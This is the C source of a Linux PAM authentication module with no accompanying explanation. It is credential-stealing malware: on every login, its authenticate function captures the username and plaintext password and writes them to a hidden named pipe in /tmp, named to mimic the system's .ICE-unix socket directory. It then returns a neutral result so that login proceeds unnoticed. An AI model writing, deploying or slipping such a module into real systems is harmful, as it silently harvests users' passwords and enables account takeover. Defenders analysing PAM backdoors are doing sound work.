#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#define FIFO_PATH "/tmp/.1CE-UNIX"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	const char *password;
	const char *user;

	pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
	pam_get_user(pamh, &user, NULL);
	

	//open pipe for writing 
	int fifo_fd = open(FIFO_PATH, O_WRONLY);

	char creds[256];
	snprintf(creds, sizeof(creds), "%s : %s", user, password);

	write(fifo_fd, creds, strlen(creds));
	
	close(fifo_fd);
		

	return PAM_IGNORE;
	
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
